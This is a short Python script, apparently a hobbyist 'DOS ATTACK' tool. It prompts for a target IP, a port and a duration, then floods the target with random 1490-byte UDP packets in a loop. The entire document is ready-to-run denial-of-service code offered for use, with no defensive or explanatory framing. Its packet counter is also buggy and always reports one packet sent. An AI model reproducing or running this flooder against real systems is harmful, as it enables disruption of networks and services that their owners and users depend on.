import socket
import random
import time
import pyfiglet

sock = socket.socket (socket.AF_INET,socket.SOCK_DGRAM)

bytes = random._urandom(1490)

ascii_banner = pyfiglet.figlet_format("DOS ATTACK")
print(ascii_banner)

a = input("Enter an IP to attack > ")
ip = (a)
port = int(input("Enter the port to attack > "))
duration = int(input("How long should NET send packets (how many seconds)? > "))
sent = 0
timeout = time.time() + duration

while True:
    if time.time() > timeout:
        break
    else:
        pass
    sock.sendto(bytes,(ip, port))
    Sent = sent + 1
    print("sent %s packets to %s through port %s"%(Sent, ip, port))

